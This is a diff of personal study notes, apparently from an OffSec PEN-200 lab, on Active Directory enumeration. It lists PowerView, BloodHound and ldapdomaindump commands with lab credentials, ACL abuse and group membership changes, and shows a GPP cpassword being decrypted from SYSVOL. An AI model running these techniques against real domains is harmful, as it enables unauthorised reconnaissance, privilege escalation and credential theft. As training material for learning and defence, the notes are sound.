@@ -1,12 +1,42 @@
 > [!info] To bypass the execution policy use `powershell -ep bypass`
-# Introduction & Enumeration
+
+Nmap scan in the AD machine:
+```text
+Target_Name: CORP
+NetBIOS_Domain_Name: CORP
+NetBIOS_Computer_Name: CLIENT75
+DNS_Domain_Name: corp.com
+DNS_Computer_Name: client75.corp.com
+DNS_Tree_Name: corp.com
+```
+
+We can get the DC ip with foothold with the command nslookup:
+```shell
+PS C:\Users\stephanie> nslookup
+DNS request timed out.
+    timeout was 2 seconds.
+Default Server:  UnKnown
+Address:  192.168.211.70
+```
+
+Or doing a zone transfer if the box has the port 53 open
+
+| **Command** | **Description** |
+| ---- | ---- |
+| `ldapdomaindump -u <DOMAIN\username> -p <Password> <DC Ip> -o ldap_stuff`<br>`ldapdomaindump -u 'CORP\stephanie' -p 'LegmanTeamBenzoin!!' 192.168.211.70 -o ldap_stuff` | LDAP Domain Dump |
+| `bloodhound-python -u <UserName> -p <Password> -ns <DC Ip> -d <Domain> -c All`<br>`bloodhound-python -u 'stephanie' -p 'LegmanTeamBenzoin!!' -ns 192.168.211.70 -d corp.com -c all` | Bloodhound |
+| `.\SharpHound.exe -c All --zipfilename output-files` | SharpHound exe |
+| `Import-Module .\Sharphound.ps1`<br>`Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"`<br> | SharpHound ps |
+
+We need to have a clear list of computers, users, and groups in the domain, and continue our enumeration focusing on the relationships between as many objects as possible.
 
 Members of **Domain Admins** are among the most privileged objects in the domain. If an attacker compromises a member of this group (often referred to as _domain administrators_), they essentially gain complete control over the domain.
 
-This attack vector could extend beyond a single domain since an AD instance can host more than one domain in a _domain tree_ or multiple domain trees in a _domain forest_. While there is a Domain Admins group for each domain in the forest, members of the _Enterprise Admins_ group are granted full control over all the domains in the forest and have Administrator privilege on all DCs. This is obviously a high-value target for an attacker.
+This attack vector could extend beyond a single domain since an AD instance can host more than one domain in a _domain tree_ or multiple domain trees in a _domain forest_. While there is a Domain Admins group for each domain in the forest, members of the **Enterprise Admins** group are granted full control over all the domains in the forest and have Administrator privilege on all DCs. This is obviously a high-value target for an attacker.
 
-# Manual enumeration
+# Manual Enumeration
 
+#### Users & Groups: Building a script
 | **Command** | **Description** |
 | ---- | ---- |
 | `net user /domain` | List AD users |
@@ -104,48 +134,112 @@ CN=pete,CN=Users,DC=corp,DC=com
 CN=dave,CN=Users,DC=corp,DC=com
 ```
 
-#### PowerView (powerful enumeration)
+#### PowerView & Miscellaneous / SPNs
+
+Do not forget to import the module first
+
+| **Command** | **Description** |
+| ---- | ---- |
+| `Get-NetDomain` | AD Info |
+| `Get-NetUser`<br>`Get-NetUser "jeff"`<br>`Get-NetUser \| select cn,pwdlastset,lastlogon`<br> | AD Users<br>(No diagonal bar in the pipe) |
+| `Get-NetGroup`<br>`Get-NetGroup "Sales Department"`<br>`Get-NetGroup \| select member` | AD groups<br>(No diagonal bar in the pipe) |
+| `Get-NetComputer`<br>`Get-NetComputer \| select operatingsystem,dnshostname` | AD Computers<br>(No diagonal bar in the pipe) |
+| `Find-LocalAdminAccess` | Check if our user has administrative permissions on any computer in the domain |
+| `Get-NetSession -ComputerName web04`<br>`Get-NetSession -ComputerName web04 -Verbose` | Find logged users in the specified computer. It relies on the SrvsvcSessionInfo service<br>If no output retrieved we may have no permission |
+| `Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ \| fl` | Check permissions to enumerate sessions with _NetSessionEnum_ (previous command) |
+| `.\PsLoggedon.exe \\web04` | Another way to find logged users in the specified computer. It relies on the _Remote Registry_ service.<br>It has not been enabled by default on Windows workstations since Windows 8, but system administrators may enable it |
+
+> [!info] One attack vector could be find if our current user has administrative permissions on any computer in the domain, and then check for logged users to log in there and steal their credentials
+
+Applications must be executed in the context of an operating system user. If a user launches an application, that user account defines the context. However, services launched by the system itself run in the context of a _Service Account_. In other words, isolated applications can use a set of predefined service accounts, such as _LocalSystem_, _LocalService_ and _NetworkService_.
+
+For more complex applications, a domain user account may be used to provide the needed context while still maintaining access to resources inside the domain. When applications like _Exchange_, MS SQL, or _Internet Information Services_ (IIS) are integrated into AD, a unique service instance identifier known as _Service Principal Name_ (SPN) associates a service to a specific service account in Active Directory. 
+
+To enumerate SPNs in the domain:
+
+| **Command** | **Description** |
+| ---- | ---- |
+| `setspn -L iis_service` | Enumerate SPNs for specified user |
+| `Get-NetUser -SPN \| select samaccountname,serviceprincipalname`<br> | Enumerate SPNs with a pipe to retrieve samaccountname and serviceprincipalname<br>(No diagonal bar in the pipe) |
+In the example, the _serviceprincipalname_ of thie iis_service is set to "HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80", which is indicative of a web server. We can attempt to resolve web04.corp.com with **nslookup**:
 
 ```shell
-PS C:\Tools> Import-Module .\PowerView.ps1
-PS C:\Tools> Get-NetDomain
+PS C:\Tools\> nslookup.exe web04.corp.com
+Server:  UnKnown
+Address:  192.168.50.70
 
-Forest                  : corp.com
-DomainControllers       : {DC1.corp.com}
-Children                : {}
-DomainMode              : Unknown
-DomainModeLevel         : 7
-Parent                  :
-PdcRoleOwner            : DC1.corp.com
-RidRoleOwner            : DC1.corp.com
-InfrastructureRoleOwner : DC1.corp.com
-Name                    : corp.com
-
-PS C:\Tools> Get-NetUser
-
-logoncount             : 113
-iscriticalsystemobject : True
-description            : Built-in account for administering the computer/domain
-distinguishedname      : CN=Administrator,CN=Users,DC=corp,DC=com
-objectclass            : {top, person, organizationalPerson, user}
-lastlogontimestamp     : 9/13/2022 1:03:47 AM
-name                   : Administrator
-[...SNIP...]
-
-PS C:\Tools> Get-NetUser | select cn,pwdlastset,lastlogon
-
-cn            pwdlastset            lastlogon
---            ----------            ---------
-Administrator 8/16/2022 5:27:22 PM  9/14/2022 2:37:15 AM
-Guest         12/31/1600 4:00:00 PM 12/31/1600 4:00:00 PM
-krbtgt        9/2/2022 4:10:48 PM   12/31/1600 4:00:00 PM
-
-PS C:\Tools> Get-NetGroup "Sales Department" | select member
-
-member
-------
-{CN=Development Department,DC=corp,DC=com, CN=pete,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
+Name:    web04.corp.com
+Address:  192.168.50.72
 ```
+
+#### Object Permissions & Domain Shares / ACEs & ACL
+
+AD may have a set of permissions applied to it with multiple _Access Control Entries_ (ACE). These ACEs make up the _Access Control List_ (ACL). Each ACE defines whether access to the specific object is allowed or denied. AD includes a wealth of permission types that can be used to configure an ACE. However, from an attacker's standpoint, we are mainly interested in a few key permission types. Here's a list of the most interesting ones along with a description of the permissions they provide: (The highest access permission we can have on an object is **GenericAll**)
+```text
+GenericAll: Full permissions on object
+GenericWrite: Edit certain attributes on the object
+WriteOwner: Change ownership of the object
+WriteDACL: Edit ACE's applied to object
+AllExtendedRights: Change password, reset password, etc.
+ForceChangePassword: Password change for object
+Self (Self-Membership): Add ourselves to for example a group
+```
+
+We can use **Get-ObjectAcl** to enumerate ACEs with PowerView
+
+| **Command** | **Description** |
+| ---- | ---- |
+| `Get-ObjectAcl -Identity stephanie` | To enumerate ACE |
+| `Get-ObjectAcl -Identity "Management Department" \| ? {$_.ActiveDirectoryRights -eq "GenericAll"} \| select SecurityIdentifier,ActiveDirectoryRights` | Filtering the ActiveDirectoryRights property, only displaying the values that equal GenericAll. Pipe the results into select, only displaying the SecurityIdentifier and ActiveDirectoryRights properties<br>(No diagonal bar in the pipe) |
+| `Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`<br>`"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" \| Convert-SidToName`<br> | To convert the Security Identifier (SID) to an actual domain object name<br>The second way we can transform many SIDs at the same time<br>(No diagonal bar in the pipe) |
+| `net group "Management Department" stephanie /add /domain` | Add a specified user to a specified group |
+| `net group "Management Department" stephanie /del /domain` | Delete a specified user from the specified group |
+| `Find-DomainShare` | List shares in the domain |
+| `Find-DomainShare -CheckShareAccess` | List shares available to us |
+In this instance, we'll first focus on **SYSVOL**, as it may include files and folders that reside on the domain controller itself. This particular share is typically used for various domain policies and scripts. By default, the **SYSVOL** folder is mapped to **%SystemRoot%\\SYSVOL\\Sysvol\\domain-name** on the domain controller and every domain user has access to it.
+```shell
+PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
+
+    Directory: \\dc1.corp.com\sysvol\corp.com
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         9/21/2022   1:11 AM                Policies
+d-----          9/2/2022   4:08 PM                scripts
+
+PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
+          name="Administrator (built-in)"
+          image="2"
+          changed="2012-05-03 11:45:20"
+          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
+    <Properties
+          action="U"
+          newName=""
+          fullName="admin"
+          description="Change local admin"
+          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+          changeLogon="0"
+          noChange="0"
+          neverExpires="0"
+          acctDisabled="0"
+          userName="Administrator (built-in)"
+          expires="2016-02-10" />
+  </User>
+</Groups>
+```
+
+Due to the naming of the folder and the name of the file itself, it appears that this is an older domain policy file. This is a common artifact on domain shares as system administrators often forget them when implementing new policies. In this particular case, the XML file describes an old policy (helpful for learning more about the current policies) and an encrypted password for the local built-in Administrator account. The encrypted password could be extremely valuable for us. Historically, system administrators often changed local workstation passwords through _Group Policy Preferences_ (GPP).
+
+However, even though GPP-stored passwords are encrypted with AES-256, the private key for the encryption has been posted on _MSDN_.[3](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/active-directory-introduction-and-enumeration/manual-enumeration-expanding-our-repertoire/enumerating-domain-shares#fn3) We can use this key to decrypt these encrypted passwords. In this case, we'll use the **gpp-decrypt** ruby script in Kali Linux that decrypts a given GPP encrypted string:
+
+```bash
+kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+P@$$w0rd
+```
+
 # Attacking AD Authentication
 
 # Lateral Movement
